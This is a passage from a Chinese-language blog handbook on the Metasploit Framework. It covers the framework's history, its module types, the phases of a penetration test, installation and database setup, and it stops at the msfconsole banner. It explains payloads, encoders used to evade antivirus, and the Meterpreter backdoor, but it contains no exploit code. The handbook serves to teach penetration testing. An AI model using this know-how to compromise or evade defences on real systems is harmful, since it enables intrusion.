<!DOCTYPE HTML>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Metasploit Framework Handbook, Qftm">
    <meta name="description" content="Maybe a hacker">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Metasploit Framework Handbook | Qftm</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Qftm</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Qftm</div>
        <div class="logo-desc">
            
            Maybe a hacker
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-heartbeat"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Metasploit Framework Handbook</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Handbook/">
                                <span class="chip bg-color">Handbook</span>
                            </a>
                        
                            <a href="/tags/Metasploit/">
                                <span class="chip bg-color">Metasploit</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="post-category">
                                攻防渗透
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2020-06-20
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2020-12-22
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    41k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    213 Min
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>众所周知<code>Metasploit</code>工具是一款强大的渗透测试利器，在渗透测试中堪称一条龙服务，那么很多人真的能够认识到它其中的强大之处吗，了解其中的每部分功能吗，还是说在个别人眼中只是一个由虚拟机搭建的一个小拓扑使用其直接攻打windows主机拿到主机权限就结束了吗，事实上<code>Metasploit</code>这款工具能做的事情很多，包括：情报(信息)搜集、目标识别、服务枚举、漏洞探测、漏洞利用、权限提升、权限维持、社会工程、内网渗透等一系列操作。</p>
<p>由于网上大部分相关文章对于<code>Metasploit</code>框架没有一个整体而完整的讲解，很多都是讲述的某一个功能点或者漏洞的使用，比如：如何使用Metasploit进行内网代理渗透、如何使用Metasploit打开对方电脑摄像头、如何使用Metasploit监视对方主机、如何使用Metasploit利用永恒之蓝漏洞攻击Windows主机、Metasploit基础、Metasploit指令用法等等，这一现象也就造成了知识点的零碎、意乱，一定程度上导致初学者的盲目、误导等。</p>
<p>正因如此自己才打算总结整理一份关于<code>Metasploit</code>框架的使用手册：<code>Metasploit Framework Handbook</code> 主要讲述的是<code>Metasploit</code>框架的一个整体使用手册（包括工具模块的解读+实战操作）。</p>
<h1 id="MsFramework"><a href="#MsFramework" class="headerlink" title="MsFramework"></a>MsFramework</h1><img src="/2020/06/20/metasploit-framework/Metasploit-Framework-Handbook-By-Qftm.jpg" style="zoom:30%;">

<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>Metasploit 是一个的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p>
<ul>
<li>官方相关链接</li>
</ul>
<pre><code>官网   https://www.rapid7.com/

Github https://github.com/rapid7/metasploit-framework</code></pre><h2 id="诞生发展"><a href="#诞生发展" class="headerlink" title="诞生发展"></a>诞生发展</h2><p>Metasploit 项目最初是由 HD Moore 在 2003 年夏季创立，目标是成为渗透攻击研究与代码开发的一个开放资源（工具集，武器库）。当时HD还是Digital Defense安全公司雇员，当他意识到他的绝大多数时间是在用来验证和处理那些公开发布的渗透代码时，他开始为编写和开发渗透代码构建一个灵活且可维护的框架平台，并在2003年10 月发布了他的第一个基于 Perl 语言(pl)的 Metasploit 版本，当时一共集成了 11 个渗透攻击模块。</p>
<p>虽然Metasploit在设计之初就具有宏伟的目标，但在v1.0发布之后并没有引起太多的关注，在SecurityFocus的渗透测试邮件组中的发布邮件仅仅只有一个回复，当时的Metasploit v1.0看起来仅仅是将大家都能获取的11个渗透代码打了一个包而已。但这次发布使得HD Moore吸引了一位志同道合之士Spoonm，他帮助HD一起完全重写了代码，并在2004年4月发布了Metasploit v2.0，版本中已经包含18个渗透攻击模块和27个攻击载荷模块，并提供了控制台终端、命令行和Web三个使用接口。</p>
<p>在 2004 年 8 月，HD 和 Spoonm 带着最新发布的 Metasploit v2.2 并在拉斯维加斯举办的 BlackHat 全球黑客大会上进行了演讲。听众被 Metasploit 的强大之处所折服，并一致认为：Metasploit 时代已经到来。更多的黑客加入 Metasploit 核心开发团队与贡献渗透攻击、载荷与辅助模块代码。</p>
<p>在Metasploit项目进入一个发展快车道时，HD Moore与Spoonm已经敏锐地意识到了其中存在的危机。在2005年的CanSecWest黑客会议上，他们指出Metasploit v2体系框架中的一些难以解决的难题，包括：</p>
<pre><code>缺乏跨平台支持，特别是不能很好地运行在 Windows 系统上。

很难支持自动化渗透攻击过程

Perl 语言的复杂性和缺点使得外部贡献者与用户规模增长不相适应

Perl 语言对一些复杂特性的支持能力较弱等。</code></pre><p>而且 v2 版本是完全围绕着渗透攻击而设计的，对信息搜集与后渗透攻击阶段无法提供有效支持。经过 18 个月的时间，Metasploit 团队使用 Ruby 语言（.rb）完全重写了 Metasploit ，并在 2007 年 5 月发布了 v3.0 版本，其中包含 177 个渗透攻击模块、104 个攻击载荷模块以及 30 个新引入的辅助模块。</p>
<p>Metasploit v3.0 的发布使得 Metasploit 不在限于用作渗透攻击软件，而真正成为一个事实上的渗透测试技术研究与开发平台。黑客们开始接受并使用Metasploit渗透攻击模块的编程语言和格式发布他们的渗透代码，并以Metasploit框架为平台开发一些新的攻击工具，以及将之前的安全工具移植到Metasploit中。</p>
<p>Metasploit v3.3版本时已经快速发展到796个模块、41.9 万行代码，成为全世界最大的Ruby语言开发项目。而Metasploit v3不断扩充的功能与特性，以及与其他安全工具之间的灵活API接口，也为渗透测试者们提供一个绝 佳的渗透软件平台，Metasploit 在安全社区取得了更加广泛的用户群。</p>
<p>2009 年 10 月，Metasploit 项目被一家渗透测试技术领域的知名安全公司 Rapid7 所收购，HD Moore全职加人Rapid7，担任首席安全官和Metasploit首席架构师。其他一些Metasploit开发团队的人员也全职加人到Rapid7公司中。由HD Moore带领专门从事Metasploit的开发，而Metasploit框架仍然保持开源发布和活跃的社区参与，这使得收购之后Metasploit的更新比所有人预期的都还要快。当然，Rapid7公司也从收购Metasploit中得到很大的好处，进一步推广公司的旗舰漏洞扫描产品NetXpose。随后于2010年10月推出MetasploitExpress和Pro商业版本，从而进军商业化渗透测试解决方案市场。</p>
<p>Metasploit v4.0 在 2011 年 8 月发布。v4.0 版本在渗透攻击、攻击载荷与辅助模块的数量上都有显著的扩展，此外还引入一种新的模块类型——后渗透攻击模块，以支持在渗透攻击环节中进行敏感信息搜集、内网拓展等一系列的攻击测试。</p>
<p>Metasploit v5.0 在 2019 年 1 月份发布。Metasploit 5.0 使用了新的数据库，并提供了一种新的数据服务。新版本引入了新的规避机制(evasion capabilities)，支持多项语言，框架建立在不断增长的世界级攻击性内容库的框架基础上。另外，此次更新还包括了可用性改进和大规模开发的支持，数据库和自动化 API 的改进等。</p>
<h2 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h2><p>Metasploit的设计尽可能采用模块化的理念，以提升代码复用效率。在基础库文件(Libraries)中提供了核心框架和一些基础功能的支持。而实现渗透测试功能的主体代码则以模块化方式组织，并按照不同用途分为7种类型的模块(Modules) ；为了扩充Metasploit框架对渗透测试全过程的支持功能特性，Metasploit 还引入了插件(Plugins) 机制，支持将外部的安全工具集成到框架中; Metasploit 框架对集成模块与插件的渗透测试功能，通过用户接口(Interfaces) 与功能程序(Utilities) 提供给渗透测试者和安全研究人员进行使用。</p>
<pre><code> → Qftm :/usr/share/metasploit-framework/modules# ls
auxiliary  encoders  evasion  exploits  nops  payloads  post
 → Qftm :/usr/share/metasploit-framework/modules# </code></pre><h3 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h3><ul>
<li>auxiliary</li>
</ul>
<pre><code> → Qftm :/usr/share/metasploit-framework/modules/auxiliary# ls
admin    bnat    cloud    docx  example.rb  fuzzers  parser  scanner  sniffer  sqli  vsploit analyze  client  crawler  dos   fileformat  gather   pdf     server   spoof    voip
 → Qftm :/usr/share/metasploit-framework/modules/auxiliary#  </code></pre><p>Metasploit 为渗透测试的信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测破解、敏感信息嗅探、探查敏感信息泄露、Fuzz 测试发掘漏洞、实施网络协议欺骗等模块。辅助模块能够帮助渗透测试者在渗透攻击之前取得目标系统丰富的情报信息，从而发起更具目标性的精准攻击。 </p>
<h3 id="渗透攻击模块"><a href="#渗透攻击模块" class="headerlink" title="渗透攻击模块"></a>渗透攻击模块</h3><ul>
<li>exploits</li>
</ul>
<pre><code> → Qftm :/usr/share/metasploit-framework/modules/exploits# ls
aix        bsd     example_linux_priv_esc.rb  firefox  irix       multi    osx   solaris
android    bsdi    example.rb                 freebsd  linux      netware  qnx   unix
apple_ios  dialup  example_webapp.rb          hpux     mainframe  openbsd  self  windows
 → Qftm :/usr/share/metasploit-framework/modules/exploits# </code></pre><p>渗透攻击模块是利用发现的安全漏洞或配置弱点对目标系统进行攻击，以植入和运行攻击载荷，从而获取对远程目标系统访问权的代码组件。</p>
<p>Metasploit框架中渗透攻击模块可以按照所利用的安全漏洞所在的位置分为主动渗透攻击与被动渗透攻击两大类。</p>
<ul>
<li>主动渗透攻击</li>
</ul>
<p>主动渗透攻击所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，因此针对它们的渗透攻击可以主动发起，通过连接目标系统网络服务，注入一些特殊构造的包含”邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进程执行在”邪恶”数据中包含攻击载荷，从而获取目标系统的控制会话。</p>
<ul>
<li>被动渗透攻击</li>
</ul>
<p>被动渗透攻击利用的漏洞位于客户端软件中，如浏览器、浏览器插件、电子邮件客户端、Office 与 Adobe 等各种文档阅读与编辑软件。对于这类存在于客户端软件的安全漏洞，我们无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击的方式，即构造出”邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务、发送邮件附件、结合社会工程学分发并诱骗目标用户打开、结合网络欺骗和劫持技术等方式，等目标系统上的用户访问到这些邪恶的内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的 Shell 会话。</p>
<h3 id="攻击载荷模块"><a href="#攻击载荷模块" class="headerlink" title="攻击载荷模块"></a>攻击载荷模块</h3><ul>
<li><p>payloads</p>
<pre><code>→ Qftm :/usr/share/metasploit-framework/modules/payloads# ls
singles  stagers  stages
→ Qftm :/usr/share/metasploit-framework/modules/payloads# </code></pre></li>
</ul>
<p>攻击载荷是在渗透攻击成功后使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。</p>
<p>Metasploit攻击载荷模块分为独立(Singles)、传输器(Stager)、传输体(Stage)</p>
<p>独立攻击载荷是完全自包含的，可直接独立地植人目标系统进行执行，比如<code>“windows/shell_bind_tcp”</code>是适用于Windows操作系统平台，能够将Shell控制会话绑定在指定TCP端口上的攻击载荷。在一些比较特殊的渗透攻击场景中，可能会对攻击载荷的大小、运行条件有所限制，比如特定安全漏洞利用时可填充邪恶攻击缓冲区的可用空间很小、Windows 7等新型操作系统所引人的NX (堆栈不可执行)、DEP (数据执行保护)等安全防御机制，在这些场景情况下，Metasploit 提供了传输器(Stager) 和传输体(Stage)配对分阶段植入的技术，由渗透攻击模块首先植人代码精悍短小且非常可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行。目前Metasploit中的Windows传输器载荷可以绕过NX、DEP等安全防御机制，可以兼容Windows7操作系统，而由传输器载荷进一步下载并执行的传输体载荷就不再受大小和安全防御机制的限制，可以加载如Meterpreter、VNC桌面控制等复杂的大型攻击载荷。传输器与传输体配对的攻击载荷模块以名称中的<code>“/”</code>标识，<code>“windows/shell/bind_tcp&quot;</code>是由一个传输器载荷(<code>bind_tcp</code>) 和一个传输体载荷(<code>Shell</code>) 所组成的，其功能等价于独立攻击载荷<code>“windows/shell_bind_tcp&quot;</code>。Metasploit所引人的多种类型载荷模块使得这些预先编制的模块化载荷代码能够适用于绝大多数的平台和攻击场景，这也为Metasploit能够成为通用化的渗透攻击与代码开发平台提供了非常有力的支持。</p>
<h3 id="空指令模块"><a href="#空指令模块" class="headerlink" title="空指令模块"></a>空指令模块</h3><ul>
<li>nops</li>
</ul>
<pre><code> → Qftm :/usr/share/metasploit-framework/modules/nops# ls
aarch64  armle  mipsbe  php  ppc  sparc  tty  x64  x86
 → Qftm :/usr/share/metasploit-framework/modules/nops# </code></pre><p>空指令(NOP) 是一些对程序运行状态不会造成任何实质影响的空操作或者无关操作指令，最典型的空指令就是空操作，在 x86 CPU 体系架构平台上的操作码是 0x90 。</p>
<p>在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行Shellcode 时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。Metasploit 框架中的空指令模块就是用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。</p>
<h3 id="编码器模块"><a href="#编码器模块" class="headerlink" title="编码器模块"></a>编码器模块</h3><ul>
<li>encoders </li>
</ul>
<pre><code> → Qftm :/usr/share/metasploit-framework/modules/encoders# ls
cmd  generic  mipsbe  mipsle  php  ppc  ruby  sparc  x64  x86
 → Qftm :/usr/share/metasploit-framework/modules/encoders#</code></pre><p>攻击载荷模块与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit 框架还需要完成一道非常重要的工序 - 编码(Encoding)。如果没有这道工序，渗透攻击可能完全不会奏效，或者中途就被检测到并阻断。这道工序是由编码器模块所完成的。</p>
<p>编码器模块的第一个使命是确保攻击载荷中不会出现滲透攻击过程中应加以避免的“坏字符”，这些“坏字符”的存在将导致特殊构造的邪恶数据缓冲区无法按照预期目标完输人到存有漏洞的软件例程中，从而使得渗透攻击触发漏洞之后无法正确执行攻击载荷，达成控制系统的目标。</p>
<p>编码器的第二个使命就是对攻击载荷进行”免杀”处理，即逃避反病毒软件、IDS 人侵检测系统和IPS人侵防御系统的检测与阻断。</p>
<h3 id="后渗透攻击模块"><a href="#后渗透攻击模块" class="headerlink" title="后渗透攻击模块"></a>后渗透攻击模块</h3><ul>
<li>post</li>
</ul>
<pre><code> → Qftm :/usr/share/metasploit-framework/modules/post# ls
aix  android  apple_ios  brocade  bsd  cisco  firefox  hardware  juniper  linux  multi  osx  solaris  windows
 → Qftm :/usr/share/metasploit-framework/modules/post#</code></pre><p>后渗透攻击模块主要支持在渗透攻击取得目标系统控制权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息、进一步拓展、实施跳板攻击等。</p>
<p>在后渗透攻击阶段，Metasploit框架中功能最强大、最具发展前景的模块是Meterpreter，Meterpreter 作为可以被渗透攻击植入到目标系统上执行的一个攻击载荷，除了提供基本的控制会话之外，还集成了大量的后渗透攻击命令与功能，并通过大量的后渗透攻击模块进一步提升它在本地攻击与内网拓展方面的能力。</p>
<h3 id="免杀模块"><a href="#免杀模块" class="headerlink" title="免杀模块"></a>免杀模块</h3><ul>
<li>evasion</li>
</ul>
<pre><code> → Qftm :/usr/share/metasploit-framework/modules/evasion# ls
windows
 → Qftm :/usr/share/metasploit-framework/modules/evasion#</code></pre><p>免杀模块核心功能对攻击载荷进行”免杀”处理。</p>
<h2 id="功能阶段"><a href="#功能阶段" class="headerlink" title="功能阶段"></a>功能阶段</h2><p>渗透攻击是目前 Metasploit 最强大和最具吸引力的核心功能，Metasploit 框架中集成了数百个针对主流操作系统平台上，不同网络服务与应用软件安全漏洞的渗透攻击模块，可以由用户在渗透攻击场景中根据漏洞扫描结果进行选择，并能够自由装配该平台上适用的具有指定功能的攻击载荷，然后通过自动化编码机制绕过攻击限制与检测措施，对目标系统实施远程攻击，获取系统的访问控制权。</p>
<p>除了渗透攻击之外，Metasploit 在发展过程中逐渐增加对渗透测试全过程的支持，包括情报搜集、威胁建模、漏洞分析、后渗透攻击与报告生成。</p>
<h3 id="情报搜集阶段"><a href="#情报搜集阶段" class="headerlink" title="情报搜集阶段"></a>情报搜集阶段</h3><p>Metasploit 一方面通过内建的一系列扫描器与查点辅助模块来获取远程服务器信息，另一方面通过插件机制集成调用 Nmap、Nessus、OpenVAS 等业界著名的开源网络扫描工具，从而具备全面的信息搜集能力，为渗透攻击实施提供必不可少的精确情报。</p>
<pre><code>目标识别与服务枚举

集成插件，漏洞扫描</code></pre><h3 id="威胁建模阶段"><a href="#威胁建模阶段" class="headerlink" title="威胁建模阶段"></a>威胁建模阶段</h3><p>在搜集信息之后，Metasploit 支持一系列数据库命令操作直接将这些信息汇总至PostgreSQL、MySQL、SQLite 数据库中，并为用户提供易用的数据库查询命令，可以帮助渗透测试者对目标系统搜索到的情报进行威胁建模，从中找出最可行的攻击路径。</p>
<h3 id="漏洞分析阶段"><a href="#漏洞分析阶段" class="headerlink" title="漏洞分析阶段"></a>漏洞分析阶段</h3><p>除了信息搜集环节能够直接扫描出一些已公布的安全漏洞之外，Metasploit 中还提供了大量的协议 Fuzz 测试器与 Web 应用漏洞探测分析模块，支持具有一定水平能力的渗透测试者在实际过程中尝试挖掘出 0Day 漏洞，并对漏洞机理与利用方法进行深入分析，而这将为渗透攻击目标带来更大的杀伤力，并提升渗透测试流程的技术含金量。</p>
<h3 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h3><p>在成功实施渗透攻击并获得目标系统的远程控制权之后，Metasploit 框架中另一个极具威名的工具 Meterpreter 在后渗透攻击阶段提供了强大功能。</p>
<p>Meterpreter 可以看作一个支持多操作系统平台，可以仅仅驻留于内存中并具备免杀能力的高级后门工具，Meterpreter 中实现了特权提升、信息提取、系统监控、跳板攻击与内网拓展等多样化的功能特性，此外还支持一种灵活可扩展的方式来加载额外功能的后渗透攻击模块。</p>
<h3 id="报告生成阶段"><a href="#报告生成阶段" class="headerlink" title="报告生成阶段"></a>报告生成阶段</h3><p>Metasploit 框架获得的渗透测试结果可以输入至内置数据库中，因此这些结果可以通过数据查询来获取，并辅助渗透测试报告的写作。</p>
<p>商业版的 Metasploit Pro 具备了更加强大的报告生成功能，可以输出 HTML、XML、Word和 PDF 格式的报告。</p>
<h2 id="工具管理"><a href="#工具管理" class="headerlink" title="工具管理"></a>工具管理</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
<li>官方安装Wiki</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><ul>
<li>以Debian-kali为例</li>
</ul>
<p>MSF 安装路径 <code>/usr/share/metasploit-framework</code>，如果使用msf自带的更新组件<code>msfupdate</code>会显示更新失败不再支持</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfupdate </span>
msfupdate is no longer supported when Metasploit is part of the operating
system. Please use <span class="token string">'apt update; apt install metasploit-framework'</span>
 → Qftm :~/Desktop<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用系统apt包管理工具进行更新</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><h4 id="自动配置连接数据库"><a href="#自动配置连接数据库" class="headerlink" title="自动配置连接数据库"></a>自动配置连接数据库</h4><ul>
<li>启动postgresql数据库服务</li>
</ul>
<pre><code> → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
 → Qftm :~/Desktop# service postgresql start
 → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Wed 2020-06-24 03:24:56 EDT; 3s ago
    Process: 4575 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 4575 (code=exited, status=0/SUCCESS)

Jun 24 03:24:56 Pentesting systemd[1]: Starting PostgreSQL RDBMS...
Jun 24 03:24:56 Pentesting systemd[1]: Started PostgreSQL RDBMS.
 → Qftm :~/Desktop#</code></pre><ul>
<li>msf连接配置</li>
</ul>
<p>初始化msfdb</p>
<pre><code> → Qftm ← :~# msfdb init
[+] Starting database
[+] Creating database user &#39;msf&#39;
为新角色输入的口令: 
再输入一遍: 
[+] Creating databases &#39;msf&#39;
[+] Creating databases &#39;msf_test&#39;
[+] Creating configuration file &#39;/usr/share/metasploit-framework/config/database.yml&#39;
[+] Creating initial database schema
 → Qftm ← :~# </code></pre><p>启动MSF查看数据库连接情况</p>
<pre><code> → Qftm :~/Desktop# msfconsole 


MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v5.0.93-dev                          ]
+ -- --=[ 2029 exploits - 1100 auxiliary - 344 post       ]
